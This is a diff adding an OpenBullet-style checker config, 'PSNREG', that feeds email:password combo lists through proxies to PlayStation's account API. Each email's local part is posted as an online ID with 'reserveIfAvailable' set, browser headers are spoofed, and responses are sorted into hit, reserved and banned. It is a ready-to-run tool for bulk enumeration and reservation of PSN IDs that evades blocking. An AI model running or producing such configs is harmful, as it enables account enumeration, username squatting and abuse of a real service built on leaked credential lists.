@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "PSNREG",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-08T12:35:54.6307218+00:00",
+  "AdditionalInfo": "May not be 100% correct",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "UUSER" 
+REQUEST POST "https://accounts.api.playstation.com/api/v1/accounts/onlineIds" AutoRedirect=FALSE 
+  CONTENT "{\"onlineId\":\"<UUSER>\",\"reserveIfAvailable\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/create_account/?entry=%2Fcreate_account&tp_psn=true&ui=pr&client_id=fe1fdbfa-f1a1-47ac-b793-e648fba25e86&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&request_locale=en_ZA&response_type=code&scope=psn:s2s&service_entity=urn:service-entity:psn&service_logo=ps" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"code\":\"3101\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"expirationDate\"" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
